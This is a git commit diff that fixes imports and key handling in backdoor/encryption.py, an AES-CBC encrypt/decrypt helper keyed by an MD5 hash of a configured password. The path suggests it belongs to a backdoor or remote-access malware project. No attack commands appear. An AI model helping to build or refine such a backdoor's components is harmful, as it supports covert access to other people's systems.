f59e96ad11eab868b05aa3b0c47cab16b8037674
root <young_uno1080@yahoo.com>
2018-05-20 22:59:28 -0700

    Fix encryption file

--- backdoor/encryption.py
+++ backdoor/encryption.py
@@ -1,22 +1,25 @@
-from Cryto.Cipher import AES
-from Cryto import Random
+from Crypto.Cipher import AES
+from Crypto import Random
 import base64
+import hashlib
+import config
 
 BLOCK_SIZE = 16
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
             chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
 unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+masterkey = hashlib.md5((config.password).encode('utf8')).hexdigest()
 
-def encrypt(data, password):
-    raw = pad(raw)
+def encrypt(data):
+    raw = pad(data)
     iv = Random.new().read(AES.block_size)
-    cipher = AES.new(password, AES.MODE_CBC, iv)
-    return base64.b64encode(iv + cipher.encrypt(data))
+    cipher = AES.new(masterkey, AES.MODE_CBC, iv)
+    return base64.b64encode(iv + cipher.encrypt(raw))
 
-def decrypt(data, password):
+def decrypt(data):
     if len(data) <= 16:
         return ""
     data = base64.b64decode(data)
     iv = data[:16]
-    cipher = AES.new(password, AES.MODE_CBC, iv)
+    cipher = AES.new(masterkey, AES.MODE_CBC, iv)
     return unpad(cipher.decrypt(data[16:]))
